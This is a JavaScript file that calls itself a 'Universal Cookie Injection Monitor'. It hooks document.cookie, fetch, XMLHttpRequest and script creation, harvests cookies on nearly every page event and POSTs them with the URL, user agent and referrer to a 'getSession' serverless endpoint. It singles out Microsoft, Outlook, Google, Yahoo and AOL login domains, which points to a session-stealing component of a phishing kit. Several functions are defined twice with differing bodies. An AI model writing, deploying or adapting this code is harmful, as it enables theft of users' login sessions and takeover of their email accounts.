// Universal Cookie Injection Monitor - Enhanced for ALL DOMAINS
(function() {
    'use strict';
    
    // Check if we're in a browser environment
    if (typeof window === 'undefined' || typeof document === 'undefined') {
        console.warn('Universal Cookie Monitor loaded in non-browser environment');
        return;
    }
    
    console.log('🌍 Universal Cookie Injection Monitor loaded - ALL DOMAINS');
    
    // Store original cookie descriptor
    const originalCookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
    
    // Cookie storage
    let capturedCookies = [];
    let allDomainCookies = {};
    let crossDomainRequests = [];
    
    // Function to capture and send cookie data
    function captureCookieData(action, cookieString, domain = window.location.hostname) {
        const timestamp = new Date().toISOString();
        const cookieData = {
            action: action,
            cookie: cookieString,
            domain: domain,
            url: window.location.href,
            timestamp: timestamp,
            userAgent: navigator.userAgent,
            referrer: document.referrer
        };
        
        capturedCookies.push(cookieData);
        
        if (!allDomainCookies[domain]) {
            allDomainCookies[domain] = [];
        }
        allDomainCookies[domain].push(cookieData);
        
        console.log(`🌍 Cookie ${action} on ${domain}:`, cookieString?.substring(0, 100) + (cookieString?.length > 100 ? '...' : ''));
        
        // Send to backend if available
        try {
            fetch('/.netlify/functions/getSession', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(cookieData)
            }).catch(e => console.log('Cookie capture endpoint not available'));
        } catch (e) {
            // Silently fail if endpoint not available
        }
    }
    
    // Enhanced cross-domain monitoring
    function monitorCrossDomainRequest(url, method = 'GET') {
        try {
            const urlObj = new URL(url, window.location.href);
            const domain = urlObj.hostname;
            
            // Monitor ALL domains, not just cross-domain
            const requestData = {
                url: url,
                domain: domain,
                method: method,
                timestamp: new Date().toISOString(),
                cookies: document.cookie
            };
            
            crossDomainRequests.push(requestData);
            captureCookieData('DOMAIN_REQUEST', document.cookie, domain);
            console.log(`🌐 Request to ${domain}:`, url);
            
            // Special handling for Microsoft domains
            if (domain.includes('microsoftonline.com') || 
                domain.includes('login.live.com') || 
                domain.includes('outlook.com') ||
                domain.includes('login.microsoft.com')) {
                console.log(`🔥 Microsoft domain detected: ${domain}`);
                // Force immediate cookie capture
                setTimeout(() => {
                    const newCookies = document.cookie;
                    if (newCookies) {
                        captureCookieData('MICROSOFT_DOMAIN', newCookies, domain);
                    }
                }, 500);
            }
            
            // Handle other email providers
            if (domain.includes('google.com') || 
                domain.includes('yahoo.com') || 
                domain.includes('aol.com')) {
                console.log(`📧 Email provider detected: ${domain}`);
                setTimeout(() => {
                    const newCookies = document.cookie;
                    if (newCookies) {
                        captureCookieData('EMAIL_PROVIDER', newCookies, domain);
                    }
                }, 500);
            }
        } catch (e) {
            console.warn('Invalid URL for domain monitoring:', url);
        }
    }
    
    // Enhanced iframe monitoring for ALL domains
    function monitorIframes() {
        const iframes = document.querySelectorAll('iframe');
        iframes.forEach(iframe => {
            try {
                const iframeSrc = iframe.src || iframe.getAttribute('src');
                if (iframeSrc) {
                    const iframeDomain = new URL(iframeSrc, window.location.href).hostname;
                    console.log(`🖼️ Monitoring iframe: ${iframeDomain}`);
                    
                    // Try to access iframe cookies
                    try {
                        if (iframe.contentDocument) {
                            const iframeCookies = iframe.contentDocument.cookie;
                            if (iframeCookies) {
                                captureCookieData('IFRAME_READ', iframeCookies, iframeDomain);
                                console.log(`🍪 Iframe cookies from ${iframeDomain}:`, iframeCookies);
                            }
                        }
                    } catch (crossOriginError) {
                        // Expected for cross-origin iframes
                        console.log(`🔒 Cross-origin iframe: ${iframeDomain}`);
                        captureCookieData('CROSS_ORIGIN_IFRAME', document.cookie, iframeDomain);
                    }
                }
            } catch (e) {
                console.warn('Error monitoring iframe:', e);
            }
        });
    }
    
    // Enhanced monitoring for ALL domains
    function enhancedDomainMonitoring() {
        // Monitor current domain
        const currentDomain = window.location.hostname;
        console.log(`🌍 Enhanced monitoring active for: ${currentDomain}`);
        
        // Capture cookies from current domain
        const currentCookies = document.cookie;
        if (currentCookies) {
            captureCookieData('CURRENT_DOMAIN', currentCookies, currentDomain);
        }
        
        // Monitor for dynamic content changes
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                mutation.addedNodes.forEach((node) => {
                    if (node.nodeType === Node.ELEMENT_NODE) {
                        // Check for new iframes
                        if (node.tagName === 'IFRAME') {
                            setTimeout(() => monitorIframes(), 1000);
                        }
                        
                        // Check for new scripts
                        if (node.tagName === 'SCRIPT') {
                            setTimeout(() => {
                                const newCookies = document.cookie;
                                if (newCookies) {
                                    captureCookieData('SCRIPT_INJECTION', newCookies, currentDomain);
                                }
                            }, 500);
                        }
                    }
                });
            });
        });
        
        if (document.body) {
            observer.observe(document.body, { childList: true, subtree: true });
        }
    }
    
    // Initialize enhanced monitoring
    function initializeEnhancedMonitoring() {
        console.log('🚀 Initializing enhanced domain monitoring...');
        
        enhancedDomainMonitoring();
        monitorIframes();
        
        // Monitor for URL changes (SPA navigation)
        let currentUrl = window.location.href;
        setInterval(() => {
            if (window.location.href !== currentUrl) {
                currentUrl = window.location.href;
                console.log('🔄 URL changed, re-monitoring:', currentUrl);
                setTimeout(() => {
                    enhancedDomainMonitoring();
                    monitorIframes();
                }, 1000);
            }
        }, 1000);
    }
    
    // Enhanced cross-domain monitoring
    function monitorCrossDomainRequest(url, method = 'GET') {
        try {
            const urlObj = new URL(url, window.location.href);
            const domain = urlObj.hostname;
            
            // Monitor ALL domains, not just cross-domain
                const requestData = {
                    url: url,
                    domain: domain,
                    method: method,
                    timestamp: new Date().toISOString(),
                    cookies: document.cookie
                };
                
                crossDomainRequests.push(requestData);
                captureCookieData('DOMAIN_REQUEST', document.cookie, domain);
                console.log(`🌐 Request to ${domain}:`, url);
        } catch (e) {
            console.warn('Invalid URL for domain monitoring:', url);
        }
    }
    
    // Override document.cookie setter
    Object.defineProperty(Document.prototype, 'cookie', {
        get: function() {
            const cookies = originalCookieDescriptor.get.call(this);
            if (cookies) {
                captureCookieData('READ', cookies);
            }
            return cookies;
        },
        set: function(cookieString) {
            captureCookieData('SET', cookieString);
            return originalCookieDescriptor.set.call(this, cookieString);
        },
        configurable: true
    });
    
    // Enhanced iframe monitoring
    function monitorIframes() {
        const iframes = document.querySelectorAll('iframe');
        iframes.forEach(iframe => {
            try {
                const iframeSrc = iframe.src || iframe.getAttribute('src');
                if (iframeSrc && iframe.contentDocument) {
                    const iframeDomain = new URL(iframeSrc, window.location.href).hostname;
                    const iframeCookies = iframe.contentDocument.cookie;
                    if (iframeCookies) {
                        captureCookieData('IFRAME_READ', iframeCookies, iframeDomain);
                        console.log(`🖼️ Iframe cookies from ${iframeDomain}:`, iframeCookies);
                    }
                }
            } catch (e) {
                // Cross-origin iframe, can't access - this is expected
                if (iframe.src) {
                    try {
                        const iframeDomain = new URL(iframe.src, window.location.href).hostname;
                        console.log(`🔒 Cross-origin iframe detected: ${iframeDomain}`);
                        captureCookieData('CROSS_ORIGIN_IFRAME', document.cookie, iframeDomain);
                    } catch (urlError) {
                        // Invalid iframe src
                    }
                }
            }
        });
    }
    
    // Enhanced fetch monitoring
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
        const url = args[0];
        const options = args[1] || {};
        
        if (typeof url === 'string' || url instanceof URL) {
            monitorCrossDomainRequest(url.toString(), options.method || 'GET');
        }
        
        return originalFetch.apply(this, args).then(response => {
            // Check for new cookies after response
            setTimeout(() => {
                const newCookies = document.cookie;
                if (newCookies) {
                    captureCookieData('POST_FETCH', newCookies);
                }
            }, 100);
            return response;
        });
    };
    
    // Enhanced XMLHttpRequest monitoring
    const originalXHROpen = XMLHttpRequest.prototype.open;
    const originalXHRSend = XMLHttpRequest.prototype.send;
    
    XMLHttpRequest.prototype.open = function(method, url, ...args) {
        this._monitorUrl = url;
        this._monitorMethod = method;
        
        if (typeof url === 'string') {
            monitorCrossDomainRequest(url, method);
        }
        
        return originalXHROpen.call(this, method, url, ...args);
    };
    
    XMLHttpRequest.prototype.send = function(data) {
        const xhr = this;
        
        xhr.addEventListener('load', function() {
            setTimeout(() => {
                const newCookies = document.cookie;
                if (newCookies) {
                    captureCookieData('XHR_RESPONSE', newCookies);
                }
            }, 100);
        });
        
        return originalXHRSend.call(this, data);
    };
    
    // Monitor dynamic script loading
    const originalCreateElement = document.createElement;
    document.createElement = function(tagName) {
        const element = originalCreateElement.call(this, tagName);
        
        if (tagName.toLowerCase() === 'script') {
            element.addEventListener('load', function() {
                setTimeout(() => {
                    const newCookies = document.cookie;
                    if (newCookies) {
                        captureCookieData('SCRIPT_LOAD', newCookies);
                    }
                }, 100);
            });
        }
        
        return element;
    };
    
    // Periodic cookie monitoring
    const monitoringInterval = setInterval(() => {
        const currentCookies = document.cookie;
        if (currentCookies) {
            captureCookieData('PERIODIC_CHECK', currentCookies);
        }
        monitorIframes();
        enhancedDomainMonitoring();
    }, 2000);
    
    // Monitor storage events
    window.addEventListener('storage', function(e) {
        captureCookieData('STORAGE_EVENT', document.cookie);
    });
    
    // Monitor page visibility changes
    document.addEventListener('visibilitychange', function() {
        if (!document.hidden) {
            captureCookieData('PAGE_VISIBLE', document.cookie);
        }
    });
    
    // Monitor various page events
    ['focus', 'blur', 'beforeunload', 'unload'].forEach(eventType => {
        window.addEventListener(eventType, function() {
            const cookies = document.cookie;
            if (cookies) {
                captureCookieData(`WINDOW_${eventType.toUpperCase()}`, cookies);
            }
        });
    });
    
    // Monitor hash changes (for SPA navigation)
    window.addEventListener('hashchange', function() {
        captureCookieData('WINDOW_FOCUS', document.cookie);
    });
    
    // Monitor popstate (for SPA navigation)
    window.addEventListener('popstate', function() {
        captureCookieData('POPSTATE', document.cookie);
    });
    
    // Expose global functions for manual access
    window.getCapturedCookies = function() {
        return capturedCookies;
    };
    
    window.getAllDomainCookies = function() {
        return allDomainCookies;
    };
    
    window.getCrossDomainRequests = function() {
        return crossDomainRequests;
    };
    
    window.forceCookieCapture = function() {
        captureCookieData('MANUAL_CAPTURE', document.cookie);
        monitorIframes();
        return {
            cookies: document.cookie,
            domains: Object.keys(allDomainCookies),
            crossDomainRequests: crossDomainRequests.length
        };
    };
    
    // Initial capture
    setTimeout(() => {
        captureCookieData('INITIAL_LOAD', document.cookie);
        monitorIframes();
        initializeEnhancedMonitoring();
    }, 500);
    
    console.log('🌍 Universal Cookie Monitor active for ALL domains - Enhanced version with full domain coverage');
})();